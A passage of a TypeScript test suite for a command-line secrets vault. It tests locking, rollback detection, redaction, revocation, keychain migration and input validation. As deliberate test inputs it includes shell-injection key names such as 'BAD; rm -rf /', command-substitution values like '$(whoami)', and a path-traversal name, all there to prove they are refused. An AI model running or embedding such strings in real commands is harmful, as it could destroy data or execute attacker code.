    process.env.HUSH_IDENTITY = encodeSecret(generateIdentity()); // not the keychain
  };
  const unpin = () => {
    delete process.env.HUSH_BIOMETRY;
    delete process.env.HUSH_IDENTITY;
  };

  test("the rung is a strict checklist — a later win does not skip an earlier gap", () => {
    pin();
    const { dir, hushDir, vault } = rig();
    // Approval (rung 3) passes by default, but a stray .env (rung 1) does not.
    writeFileSync(join(dir, ".env"), "FOO=bar");

    const p = assess(vault, hushDir, dir);
    assert.equal(p.rung, 0, "a rung-3 pass must not lift you past a rung-1 gap");
    assert.equal(p.next?.id, "no-plaintext");
    assert.ok(p.checks.find((c) => c.id === "approval")?.pass, "approval is on by default");

    // Clearing the rung-1 gap earns rung 1; the keychain gap now caps you there.
    rmSync(join(dir, ".env"));
    const after = assess(vault, hushDir, dir);
    assert.equal(after.rung, 1);
    assert.equal(after.next?.id, "keychain", "the next gap is the rung-2 one");
    rmSync(dir, { recursive: true, force: true });
    unpin();
  });

  test("every failing check offers a command and a reason", () => {
    pin();
    const { dir, hushDir, vault } = rig();
    for (const c of assess(vault, hushDir, dir).checks.filter((x) => !x.pass)) {
      assert.ok(c.command, `${c.id} has no command`);
      assert.ok(c.gap.length > 8, `${c.id} has no usable gap phrasing`);
    }
    rmSync(dir, { recursive: true, force: true });
    unpin();
  });

  test("risk is judged from key names, without decrypting anything", () => {
    pin();
    const { dir, vault, owner } = rig();
    vault.set(owner, "default", "STRIPE_SECRET_KEY", "sk_live_x");
    vault.set(owner, "default", "AWS_SECRET_ACCESS_KEY", "y");
    vault.set(owner, "default", "DATABASE_URL", "postgres://z");
    vault.set(owner, "default", "FEATURE_FLAG", "on");

    const risk = assessRisk(vault);
    assert.equal(risk.weight, 2, "three high-value keys should weigh 2");
    assert.match(risk.reasons[0], /3 high-value secrets/);
    assert.ok(!risk.reasons.join(" ").includes("sk_live_x"), "risk text must not carry values");
    rmSync(dir, { recursive: true, force: true });
    unpin();
  });

  test("a boring vault is judged boring", () => {
    pin();
    const { dir, vault, owner } = rig();
    vault.set(owner, "default", "FEATURE_FLAG_URL", "https://x");
    assert.equal(assessRisk(vault).weight, 0);
    rmSync(dir, { recursive: true, force: true });
    unpin();
  });

  test("a production environment and extra members raise the weight", () => {
    pin();
    const { dir, vault, owner } = rig();
    vault.set(owner, "prod", "SOME_KEY", "v");
    vault.addRecipient(owner, "bob", encodePub(generateIdentity().pub));
    const risk = assessRisk(vault);
    assert.ok(risk.weight >= 2);
    assert.ok(risk.reasons.some((r) => /production/.test(r)));
    assert.ok(risk.reasons.some((r) => /2 people/.test(r)));
    rmSync(dir, { recursive: true, force: true });
    unpin();
  });

  test("reaching the top rung leaves nothing to nudge about", () => {
    pin();
    const { dir, hushDir, vault } = rig();
    const p = assess(vault, hushDir, dir);
    // Simulate every check passing.
    const topped = { ...p, rung: 5 as const, next: null };
    assert.equal(shouldNudge(topped), false);
    rmSync(dir, { recursive: true, force: true });
    unpin();
  });

  test("HUSH_NO_NUDGE and CI silence the nudge entirely", () => {
    pin();
    const { dir, hushDir, vault } = rig();
    const p = assess(vault, hushDir, dir);
    assert.ok(p.next, "there should be something to nudge about");

    process.env.HUSH_NO_NUDGE = "1";
    assert.equal(shouldNudge(p), false);
    delete process.env.HUSH_NO_NUDGE;

    process.env.CI = "true";
    assert.equal(shouldNudge(p), false, "never nudge in CI logs");
    delete process.env.CI;

    rmSync(dir, { recursive: true, force: true });
    unpin();
  });

  test("migrating to the keychain refuses when the identity comes from the environment", () => {
    // The dangerous path is deleting the only copy of a key. Guards first.
    process.env.HUSH_IDENTITY = encodeSecret(generateIdentity());
    const r = migrateIdentityToKeychain();
    assert.equal(r.ok, false);
    assert.match(r.message, /environment variable/);
    delete process.env.HUSH_IDENTITY;
  });
});

describe("concurrency", () => {
  const rig = () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    Vault.create(path, "t", { name: "a", pub: owner.pub }).save();
    return { dir, path, owner };
  };

  test("two writers do not lose each other's keys", () => {
    const { dir, path, owner } = rig();
    // Both read the same starting state — the classic lost-update setup.
    const a = Vault.open(path);
    const b = Vault.open(path);

    a.set(owner, "default", "FROM_A", "value-a");
    a.save();
    b.set(owner, "default", "FROM_B", "value-b");
    b.save();

    const fresh = Vault.open(path);
    assert.equal(fresh.get(owner, "default", "FROM_A"), "value-a", "the first write was erased");
    assert.equal(fresh.get(owner, "default", "FROM_B"), "value-b");
    rmSync(dir, { recursive: true, force: true });
  });

  test("a late deletion still applies to the newer copy", () => {
    const { dir, path, owner } = rig();
    const seed = Vault.open(path);
    seed.set(owner, "default", "DOOMED", "x");
    seed.set(owner, "default", "KEEP", "y");
    seed.save();

    const a = Vault.open(path);
    const b = Vault.open(path);
    a.set(owner, "default", "NEW", "z");
    a.save();
    b.delete("default", "DOOMED");
    b.save();

    const fresh = Vault.open(path);
    assert.equal(fresh.has("default", "DOOMED"), false);
    assert.equal(fresh.get(owner, "default", "NEW"), "z");
    assert.equal(fresh.get(owner, "default", "KEEP"), "y");
    rmSync(dir, { recursive: true, force: true });
  });

  test("a membership change refuses to merge rather than guessing", () => {
    const { dir, path, owner } = rig();
    const a = Vault.open(path);
    const b = Vault.open(path);

    a.set(owner, "default", "K", "v");
    a.save();

    // b is working from a pre-change copy; silently rewriting it would drop K.
    b.addRecipient(owner, "bob", encodePub(generateIdentity().pub));
    assert.throws(() => b.save(), /changed on disk/);

    assert.equal(Vault.open(path).get(owner, "default", "K"), "v", "the other write survived");
    rmSync(dir, { recursive: true, force: true });
  });

  test("the lock is released even when the write fails", () => {
    const { dir, path, owner } = rig();
    const v = Vault.open(path);
    v.set(owner, "default", "K", "v");
    (v.data as unknown as { boom: unknown }).boom = {};
    (v.data as unknown as { boom: { self: unknown } }).boom.self =
      (v.data as unknown as { boom: unknown }).boom;

    assert.throws(() => v.save());
    assert.deepEqual(readdirSync(dir).filter((f) => f.endsWith(".lock")), [], "lock left behind");
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("rollback detection", () => {
  const rig = () => {
    const home = scratch();
    process.env.HUSH_HOME = home;
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    const vault = Vault.create(path, "t", { name: "a", pub: owner.pub });
    return { home, dir, path, owner, vault };
  };
  const done = (home: string, dir: string) => {
    delete process.env.HUSH_HOME;
    for (const d of [home, dir]) rmSync(d, { recursive: true, force: true });
  };

  test("first sight of a vault is trusted and recorded", () => {
    const { home, dir, vault } = rig();
    assert.equal(checkAndRecord(vault), null);
    assert.equal(checkAndRecord(vault), null, "a second look at the same state is fine");
    done(home, dir);
  });

  test("a generation going backwards is caught, and names who came back", () => {
    const { home, dir, path, owner, vault } = rig();
    const bob = generateIdentity();
    vault.addRecipient(owner, "bob", encodePub(bob.pub));
    vault.set(owner, "default", "SHARED", "v");
    vault.save();

    const rolledBack = JSON.parse(readFileSync(path, "utf8"));
    checkAndRecord(vault); // watermark at generation 1, bob present

    vault.removeRecipient(owner, "bob"); // generation 2
    vault.save();
    assert.equal(checkAndRecord(vault), null, "moving forward is fine");

    // Bob force-pushes his old copy back.
    writeFileSync(path, JSON.stringify(rolledBack, null, 2));
    const w = checkAndRecord(Vault.open(path));
    assert.ok(w, "a rolled-back vault was accepted");
    assert.equal(w.nowGeneration, 1);
    assert.equal(w.seenGeneration, 2);
    assert.deepEqual(w.reappeared, ["bob"]);
    assert.match(describeRollback(w).join(" "), /BACKWARDS/);
    done(home, dir);
  });

  test("the watermark never moves down, so the warning keeps firing", () => {
    const { home, dir, path, owner, vault } = rig();
    vault.set(owner, "default", "K", "v");
    vault.save();
    const old = readFileSync(path, "utf8");
    checkAndRecord(vault);

    vault.rotate(owner);
    vault.save();
    checkAndRecord(vault);

    writeFileSync(path, old);
    assert.ok(checkAndRecord(Vault.open(path)), "first warning");
    assert.ok(checkAndRecord(Vault.open(path)), "must warn every time, not just once");
    done(home, dir);
  });

  test("a deliberate restore can be accepted", () => {
    const { home, dir, path, owner, vault } = rig();
    vault.set(owner, "default", "K", "v");
    vault.save();
    const old = readFileSync(path, "utf8");
    checkAndRecord(vault);
    vault.rotate(owner);
    vault.save();
    checkAndRecord(vault);

    writeFileSync(path, old);
    const restored = Vault.open(path);
    assert.ok(inspect(restored));
    acceptCurrent(restored);
    assert.equal(inspect(restored), null, "accepting did not clear the warning");
    done(home, dir);
  });
});

describe("redactor edge cases", () => {
  test("a secret whose tail begins another secret is still masked", () => {
    // Regression: "postgres://…/app" ends with the "p" that starts "postgres".
    // Fed one char at a time, the trailing "p" looks like a live partial match,
    // and cutting there emitted the complete value verbatim.
    const secret = "postgres://user:hunter2@db.internal:5432/app";
    const r = new Redactor({ DATABASE_URL: secret });
    let out = "";
    for (const ch of `db=${secret}!`) out += r.push(ch);
    out += r.flush();
    assert.equal(out, "db=[redacted:DATABASE_URL]!");
    assert.ok(!out.includes("hunter2"));
  });

  test("a value that is a prefix of itself repeated is masked every time", () => {
    const r = new Redactor({ K: "abcabc" });
    const out = r.push("abcabcabcabc") + r.flush();
    assert.ok(!out.includes("abcabc"), `leaked: ${out}`);
  });

  test("holds back nothing when no partial match is in flight", () => {
    // The whole point of the fast path: a long secret must not make every
    // unrelated write buffer kilobytes.
    const r = new Redactor({ PK: "-----BEGIN-----" + "A".repeat(3000) });
    const emitted = r.push("just an ordinary log line\n");
    assert.equal(emitted, "just an ordinary log line\n", "output was needlessly delayed");
    assert.equal(r.flush(), "");
  });

  test("a secret split across many tiny writes is still caught", () => {
    const r = new Redactor({ TOKEN: "ghp_abcdefghijklmnop" });
    let out = "";
    for (const part of ["log ghp_", "abcdef", "ghijkl", "mnop", " done"]) out += r.push(part);
    out += r.flush();
    assert.equal(out, "log [redacted:TOKEN] done");
  });

  test("two secrets sharing a prefix both get masked", () => {
    const r = new Redactor({ A: "sk_live_aaaa", B: "sk_live_bbbb" });
    const out = r.push("x sk_live_aaaa y sk_live_bbbb z") + r.flush();
    assert.equal(out, "x [redacted:A] y [redacted:B] z");
  });
});

describe("resolution consistency", () => {
  test("export resolves exactly what run injects", () => {
    // Regression: export materialised only the base env, so a project using a
    // service account got a different answer from `hush run` than from
    // `hush export` / the shell hook / a generated .env.
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "BASE_KEY", "base");
    vault.set(owner, "fal/personal", "FAL_KEY", "fal-value");

    const { secrets } = vault.resolveSets(owner, ["default", setNameFor("fal", "personal")]);

    assert.deepEqual(Object.keys(secrets).sort(), ["BASE_KEY", "FAL_KEY"]);
    assert.equal(secrets.FAL_KEY, "fal-value");
    // Whatever run injects is exactly what the .env form must contain.
    const envFile = toEnvFile(secrets);
    assert.match(envFile, /^FAL_KEY=fal-value$/m);
    assert.match(envFile, /^BASE_KEY=base$/m);
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("name validation", () => {
  test("a key name that could inject into a shell is refused", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    for (const bad of ["FOO; echo pwned", "A B", "1LEADING_DIGIT", "has-dash", "MULTI\nLINE", ""]) {
      assert.throws(() => vault.set(owner, "default", bad, "v"), /not a valid variable name/, `accepted ${JSON.stringify(bad)}`);
    }
    assert.doesNotThrow(() => vault.set(owner, "default", "GOOD_NAME_9", "v"));
    assert.doesNotThrow(() => vault.set(owner, "default", "_leading_underscore", "v"));
    rmSync(dir, { recursive: true, force: true });
  });

  test("a path-shaped environment name is refused", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    for (const bad of ["../../evil", "a/b/c", "has space", ""]) {
      assert.throws(() => vault.set(owner, bad, "K", "v"), /not a valid environment or account name/);
    }
    assert.doesNotThrow(() => vault.set(owner, "prod", "K", "v"));
    assert.doesNotThrow(() => vault.set(owner, "fal/acme", "K", "v"));
    rmSync(dir, { recursive: true, force: true });
  });

  test("shell output filters a bad name that an old vault still contains", () => {
    // Vaults created before validation may hold one; generating `export <name>=`
    // for it would be arbitrary command execution via `hush hook`.
    const shell = toShellExports({ "OK_KEY": "fine", "BAD; rm -rf /": "danger" });
    // Single-quoted: inside double quotes a shell still expands $ and backticks,
    // so the value half was a code-execution hole of its own.
    assert.match(shell, /^export OK_KEY='fine'$/m);
    assert.ok(!/^export BAD/m.test(shell), "emitted an injectable export line");
    assert.match(shell, /# skipped/);
  });

  test("env-file output filters a bad name too", () => {
    const body = toEnvFile({ "OK_KEY": "fine", "BAD NAME": "x" });
    assert.match(body, /^OK_KEY=fine$/m);
    assert.ok(!/^BAD NAME=/m.test(body));
  });
});

describe("value fidelity", () => {
  const roundTrip = (v: string) => parseEnvFile(toEnvFile({ K: v })).K;

  test("a multi-line PEM survives export and import", () => {
    const pem = "-----BEGIN PRIVATE KEY-----\nMIIEvQIBAD\nANBgkqhki\n-----END PRIVATE KEY-----";
    assert.equal(roundTrip(pem), pem);
  });

  test("shell metacharacters in a value are preserved, not evaluated", () => {
    const v = 'päss wörd ✓ $(whoami) `id` "quoted" \\backslash';
    assert.equal(roundTrip(v), v);
  });

  test("awkward values round-trip byte for byte", () => {
    for (const v of [
      "", " leading and trailing ", "a=b=c", "#hash", "line1\nline2", "tab\there",
      "carriage\r\nreturn", "'single'", '"double"', "emoji 🔐 ok", "\\\\double-backslash",
    ]) {
      assert.equal(roundTrip(v), v, `failed for ${JSON.stringify(v)}`);
    }
  });

  test("a value is stored and returned unchanged through the vault", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    const pem = "-----BEGIN KEY-----\nline two\n-----END KEY-----";
    vault.set(owner, "default", "PK", pem);
    assert.equal(vault.get(owner, "default", "PK"), pem);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a large value is handled without truncation", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    const big = "x".repeat(200_000);
    vault.set(owner, "default", "BIG", big);
    vault.save();
    assert.equal(Vault.open(join(dir, "v.json")).get(owner, "default", "BIG").length, big.length);
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("member identity", () => {
  const rig = () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "alice", pub: owner.pub });
    vault.set(owner, "default", "SHARED", "secret");
    return { dir, owner, vault };
  };

  test("two members cannot share a name, because that breaks revocation", () => {
    const { dir, owner, vault } = rig();
    const bob1 = generateIdentity();
    const bob2 = generateIdentity();
    vault.addRecipient(owner, "bob", encodePub(bob1.pub));
    assert.throws(
      () => vault.addRecipient(owner, "bob", encodePub(bob2.pub)),
      /already a member with a different key/,
    );
    rmSync(dir, { recursive: true, force: true });
  });

  test("re-adding the same key under the same name is idempotent", () => {
    const { dir, owner, vault } = rig();
    const bob = generateIdentity();
    vault.addRecipient(owner, "bob", encodePub(bob.pub));
    assert.doesNotThrow(() => vault.addRecipient(owner, "bob", encodePub(bob.pub)));
    assert.equal(vault.members().filter((m) => m.name === "bob").length, 1);
    rmSync(dir, { recursive: true, force: true });
  });

  test("revoking a name removes every key under it, even in an older vault", () => {
    const { dir, owner, vault } = rig();
    const bob1 = generateIdentity();
    const bob2 = generateIdentity();
    vault.addRecipient(owner, "bob", encodePub(bob1.pub));
    // Simulate a vault written before names were unique.
    vault.addRecipient(owner, "bob-second", encodePub(bob2.pub));
    vault.data.recipients[fingerprint(bob2.pub)].name = "bob";

    assert.equal(vault.get(bob1, "default", "SHARED"), "secret");
    assert.equal(vault.get(bob2, "default", "SHARED"), "secret");

    vault.removeRecipient(owner, "bob");

    assert.equal(vault.canRead(bob1), false, "first key still had access");
    assert.equal(vault.canRead(bob2), false, "second key still had access — revocation was a lie");
    assert.equal(vault.get(owner, "default", "SHARED"), "secret");
    rmSync(dir, { recursive: true, force: true });
  });

  test("you cannot remove yourself even via a duplicated name", () => {
    const { dir, owner, vault } = rig();
    assert.throws(() => vault.removeRecipient(owner, "alice"), /would remove your own last key/);
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("config robustness", () => {
  test("a git-conflicted vault says so instead of 'Unexpected token'", () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    writeFileSync(path, "<<<<<<< HEAD\n{}\n=======\n{}\n>>>>>>> other\n");
    assert.throws(() => Vault.open(path), /git conflict markers/);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a corrupt vault names the file and how to recover it", () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    writeFileSync(path, "not json at all");
    assert.throws(() => Vault.open(path), /is not valid JSON[\s\S]*git checkout/);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a vault from a newer hush is refused clearly", () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    writeFileSync(path, JSON.stringify({ scheme: "hush/v99" }));
    assert.throws(() => Vault.open(path), /Unsupported vault scheme/);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a link.json with no vault field explains itself", () => {
    const dir = scratch();
    mkdirSync(join(dir, ".hush"), { recursive: true });
    writeFileSync(join(dir, ".hush", "link.json"), "{}");
    // Previously surfaced as: The "path" argument must be of type string.
    assert.throws(() => resolveVaultPath(dir), /does not name a vault/);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a malformed link.json says which file is wrong", () => {
    const dir = scratch();
    mkdirSync(join(dir, ".hush"), { recursive: true });
    writeFileSync(join(dir, ".hush", "link.json"), "{bad");
    assert.throws(() => resolveVaultPath(dir), /link\.json is not valid JSON/);
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("retiring your own key", () => {
  test("you may retire one identity once another of yours remains a recipient", () => {
    // This is the last step of the hardware upgrade: add the hardware key, then
    // drop the software one so the vault is only as strong as the hardware.
    // Refusing it outright made rung 5 of the ladder unreachable.
    const dir = scratch();
    const soft = generateIdentity();
    const hard = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "me", pub: soft.pub });
    vault.set(soft, "default", "S", "secret");
    vault.addRecipient(soft, "me-hw", encodePub(hard.pub));

    // The caller holds both identities, as they would mid-upgrade.
    const both = { pub: soft.pub, priv: soft.priv, age: undefined };
    assert.doesNotThrow(() => vault.removeRecipient({ ...both }, "me-hw"));

    // Put it back and retire the software key instead.
    vault.addRecipient(soft, "me-hw", encodePub(hard.pub));
    assert.doesNotThrow(() => vault.removeRecipient(hard, "me"));

    assert.equal(vault.canRead(soft), false, "the retired key still opens the vault");
    assert.equal(vault.get(hard, "default", "S"), "secret");
    assert.deepEqual(vault.members().map((m) => m.name), ["me-hw"]);
    rmSync(dir, { recursive: true, force: true });
  });

  test("removing your only key is still refused", () => {
    const dir = scratch();
    const me = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "me", pub: me.pub });
    assert.throws(() => vault.removeRecipient(me, "me"), /would remove your own last key/);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a vault can never be left with no readers", () => {
    const dir = scratch();
    const me = generateIdentity();
    const other = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "me", pub: me.pub });
    vault.addRecipient(me, "other", encodePub(other.pub));
    vault.removeRecipient(me, "other");
    assert.throws(() => vault.removeRecipient(me, "me"), /would remove your own last key/);
    assert.ok(vault.members().length >= 1);
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("durability and concurrency, for real", () => {
  test("a save that cannot create its temp file leaves the old vault whole", () => {
    // Distinguishes temp+rename from a plain write: opening an *existing* file
    // for writing does not need directory permission, so a plain writeFileSync
    // would truncate the vault here. The atomic path fails before touching it.
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    const vault = Vault.create(path, "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "KEEP", "original-value");
    vault.save();
    const before = readFileSync(path, "utf8");

    chmodSync(dir, 0o500); // read + execute, no create
    try {
      vault.set(owner, "default", "NEW", "should-not-land");
      assert.throws(() => vault.save(), /EACCES|EPERM|EROFS/);
      assert.equal(readFileSync(path, "utf8"), before, "the vault was damaged by a failed save");
    } finally {
      chmodSync(dir, 0o700);
    }

    // And it is still a working vault afterwards.
    assert.equal(Vault.open(path).get(owner, "default", "KEEP"), "original-value");
    rmSync(dir, { recursive: true, force: true });
  });

  test("genuinely parallel processes do not lose each other's writes", () => {
    // The in-process tests are satisfied by the replay journal alone; only
    // separate processes actually exercise the lock.
    const dir = scratch();
    const home = scratch();
    const hushDir = join(dir, ".hush");
    mkdirSync(hushDir, { recursive: true });
    const owner = generateIdentity();
    Vault.create(join(hushDir, "vault.json"), "par", { name: "a", pub: owner.pub }).save();

    const cli = join(import.meta.dirname, "..", "src", "cli.ts");
    const env = {
      ...process.env,
      HUSH_HOME: home,
      HUSH_IDENTITY: encodeSecret(owner),
      HUSH_BIOMETRY: "off",
      HUSH_NO_NUDGE: "1",
      HUSH_NO_KEYCHAIN: "1",
      NO_COLOR: "1",
    };

    const N = 8;
    // Fan out through a shell so the writes genuinely overlap; spawnSync would
    // serialise them and prove nothing.
    const lines = [];
    for (let i = 0; i < N; i++) {
      lines.push(
        `printf 'value_${i}\\n' | "${process.execPath}" "${cli}" set PAR_${i} >"${join(dir, `out_${i}.log`)}" 2>&1 &`,
      );
    }
    const result = spawnSync("/bin/sh", ["-c", lines.join("\n") + "\nwait\n"], {
      cwd: dir,
      env,
      encoding: "utf8",
      timeout: 120_000,
    });
    assert.equal(result.error, undefined, `fan-out failed: ${result.error?.message}`);

    const final = Vault.open(join(hushDir, "vault.json"));
    const got = final.list("default").map((s2) => s2.key).sort();

    if (got.length !== N) {
      // Surface what the losing writers actually said, so a CI failure is
      // diagnosable instead of just "expected 8, got 7".
      const logs = [];
      for (let i = 0; i < N; i++) {
        const log = join(dir, `out_${i}.log`);
        const text = existsSync(log) ? readFileSync(log, "utf8").trim() : "(no output)";
        if (!got.includes(`PAR_${i}`)) logs.push(`PAR_${i}: ${text || "(silent)"}`);
      }
      assert.fail(`expected ${N} keys, got ${got.length} [${got.join(",")}]\n${logs.join("\n")}`);
    }

    for (let i = 0; i < N; i++) {
      assert.equal(final.get(owner, "default", `PAR_${i}`), `value_${i}`);
    }
    assert.deepEqual(readdirSync(hushDir).filter((f) => /\.lock$|\.tmp$/.test(f)), []);
    for (const d of [dir, home]) rmSync(d, { recursive: true, force: true });
  });

  test("a child killed by a signal is not reported as success", async () => {
    const result = await runWithSecrets(
      process.execPath,
      ["-e", 'process.kill(process.pid, "SIGTERM")'],
      { secrets: {}, capture: true },
    );
    assert.equal(result.signal, "SIGTERM");
    assert.equal(result.code, 143, "a SIGTERMed child reported exit 0");
  });

  test("an interrupted child reports 130, the way a shell does", async () => {
    const result = await runWithSecrets(
      process.execPath,
      ["-e", 'process.kill(process.pid, "SIGINT")'],
      { secrets: {}, capture: true },
    );
    assert.equal(result.code, 130);
  });
});

describe("keychain migration safety", () => {
  /**
   * This is the only operation in hush that can destroy a key: it deletes the
   * identity file after copying it into the keychain. If the copy silently
   * failed and the delete went ahead anyway, every vault this machine belongs
   * to would become unopenable.
   */
  const withHome = (fn: (home: string) => void) => {
    const home = scratch();
    const saved = process.env.HUSH_HOME;
    process.env.HUSH_HOME = home;
    try {
      fn(home);
    } finally {
      if (saved === undefined) delete process.env.HUSH_HOME;
      else process.env.HUSH_HOME = saved;
      rmSync(home, { recursive: true, force: true });
    }
  };

  test("the identity file survives when the keychain is unavailable", () => {
    withHome((home) => {
      process.env.HUSH_NO_KEYCHAIN = "1";
      const file = join(home, "identity");
      const key = encodeSecret(generateIdentity());
      writeFileSync(file, key, { mode: 0o600 });

      const result = migrateIdentityToKeychain();

      assert.equal(result.ok, false, "claimed success with no keychain");
      assert.ok(existsSync(file), "DELETED THE ONLY COPY OF THE KEY");
      assert.equal(readFileSync(file, "utf8"), key, "the key was altered");
      delete process.env.HUSH_NO_KEYCHAIN;
    });
  });

  test("a file that is not a hush key is left alone", () => {
    withHome((home) => {
      const file = join(home, "identity");
      writeFileSync(file, "this is not a key");
      const result = migrateIdentityToKeychain("hush-test-migration-should-not-exist");
      assert.equal(result.ok, false);
      assert.ok(existsSync(file), "removed a file it could not parse");
      assert.match(result.message, /not a valid hush key|keychain/);
    });
  });

  test("with nothing to migrate it reports so rather than acting", () => {
    withHome(() => {
      process.env.HUSH_NO_KEYCHAIN = "1";
      const result = migrateIdentityToKeychain();
      assert.equal(result.ok, false);
      delete process.env.HUSH_NO_KEYCHAIN;
    });
  });

  test("an environment-provided identity is never migrated or deleted", () => {
    withHome(() => {
      process.env.HUSH_IDENTITY = encodeSecret(generateIdentity());
      const result = migrateIdentityToKeychain();
      assert.equal(result.ok, false);
      assert.match(result.message, /environment variable/);
      delete process.env.HUSH_IDENTITY;
    });
  });
});

describe("the vault lock cannot be stolen", () => {
  test("a freshly created, still-empty lock file is respected", () => {
    // open(…,"wx") creates the lock EMPTY and fills it a moment later. Judging
    // staleness by the file's contents made that window look like a dead lock,
    // so a second writer deleted a live one — and a write was lost while still
    // reporting success. Staleness must come from mtime.
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    const vault = Vault.create(path, "t", { name: "a", pub: owner.pub });
    vault.set(owner, "default", "K", "v");
    vault.save();

    writeFileSync(`${path}.lock`, ""); // exactly what another process holds mid-acquire

    const saved = process.env.HUSH_LOCK_TIMEOUT_MS;
    process.env.HUSH_LOCK_TIMEOUT_MS = "400";
    try {
      vault.set(owner, "default", "SECOND", "v2");
      // Must wait for the lock and give up — never barge past it.
      assert.throws(() => vault.save(), /Timed out waiting for the vault lock/);
    } finally {
      if (saved === undefined) delete process.env.HUSH_LOCK_TIMEOUT_MS;
      else process.env.HUSH_LOCK_TIMEOUT_MS = saved;
      rmSync(`${path}.lock`);
    }

    // Once the holder releases it, the write goes through.
    vault.save();
    assert.equal(Vault.open(path).get(owner, "default", "SECOND"), "v2");
    rmSync(dir, { recursive: true, force: true });
  });

  test("a genuinely abandoned lock is reclaimed", () => {
    const dir = scratch();
    const path = join(dir, "vault.json");
    const owner = generateIdentity();
    const vault = Vault.create(path, "t", { name: "a", pub: owner.pub });
    vault.save();

    const lock = `${path}.lock`;
    writeFileSync(lock, JSON.stringify({ pid: 999999, at: Date.now() - 120_000 }));
    // Backdate it well past the staleness window.
    const old = new Date(Date.now() - 120_000);
    utimesSync(lock, old, old);

    vault.set(owner, "default", "AFTER_STALE", "v");
    assert.doesNotThrow(() => vault.save(), "a dead process wedged the vault forever");
    assert.equal(Vault.open(path).get(owner, "default", "AFTER_STALE"), "v");
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("migration decisions (exhaustive)", () => {
  const base = {
    keychainUsable: true,
    fromEnvironment: false,
    fileExists: true,
    fileParses: true,
    keychainAlreadyHas: false,
    writeSucceeded: true,
    readBackMatches: true,
  };

  test("the file is deleted only when the keychain provably holds the key", () => {
    // Every way the migration can go wrong must leave the file alone. This is
    // the one place in hush where being wrong loses a key permanently.
    const mustKeepFile = [
      ["no keychain", { keychainUsable: false }],
      ["identity from the environment", { fromEnvironment: true }],
      ["no file to migrate", { fileExists: false }],
      ["file is not a key", { fileParses: false }],
      ["keychain write failed", { writeSucceeded: false }],
      ["read-back did not match", { readBackMatches: false }],
      ["wrote but read-back also failed", { writeSucceeded: false, readBackMatches: false }],
    ] as const;

    for (const [label, override] of mustKeepFile) {
      const d = decideMigration({ ...base, ...override });
      assert.equal(d.deleteFile, false, `would have deleted the key: ${label}`);
    }

    const happy = decideMigration(base);
    assert.equal(happy.ok, true);
    assert.equal(happy.deleteFile, true, "the successful path must actually clean up");
  });

  test("an already-migrated machine is reported as done, not as an error", () => {
    const d = decideMigration({ ...base, fileExists: false, keychainAlreadyHas: true });
    assert.equal(d.ok, true);
    assert.equal(d.deleteFile, false);
    assert.match(d.message, /already in the keychain/);
  });

  test("every refusal explains itself", () => {
    for (const override of [
      { keychainUsable: false }, { fromEnvironment: true }, { fileExists: false },
      { fileParses: false }, { writeSucceeded: false }, { readBackMatches: false },
    ]) {
      const d = decideMigration({ ...base, ...override });
      assert.ok(d.message.length > 15, `unhelpful message: ${d.message}`);
    }
  });
});

describe("gaps found by mutation testing", () => {
  test("importing a file with unusable variable names skips them", () => {
    // parseEnvFile filters names; if that filter were dropped, vault.set would
    // throw mid-import and leave a half-imported vault.
    const parsed = parseEnvFile(
      ["GOOD_ONE=1", "bad name=2", "9LEADING=3", "has-dash=4", "ALSO_GOOD=5", "FOO;rm -rf /=6"].join("\n"),
    );
    assert.deepEqual(Object.keys(parsed).sort(), ["ALSO_GOOD", "GOOD_ONE"]);
  });

  test("a whole file of unusable names imports cleanly as nothing", () => {
    const dir = scratch();
    const owner = generateIdentity();
    const vault = Vault.create(join(dir, "v.json"), "t", { name: "a", pub: owner.pub });
    const parsed = parseEnvFile("bad name=1\n9NOPE=2\n");
    assert.deepEqual(parsed, {});
    for (const [k, v] of Object.entries(parsed)) vault.set(owner, "default", k, v);
    assert.equal(vault.list("default").length, 0);
    rmSync(dir, { recursive: true, force: true });
  });

  test("a plugin name that the regex matches but the constraint rejects", () => {
    // "../.." never matched the regex anyway; these do match it, and are the
    // reason the extra shape check exists.
    const dir = scratch();
    const write = (body: string) => {
      const p = join(dir, `id-${Math.random().toString(36).slice(2)}.txt`);
      writeFileSync(p, body);
      return p;
    };
    assert.equal(identityPlugin(write("AGE-PLUGIN-9EVIL-1XXXX")), null, "accepted a name starting with a digit");
    assert.equal(identityPlugin(write(`AGE-PLUGIN-${"A".repeat(40)}-1XXXX`)), null, "accepted an over-long name");
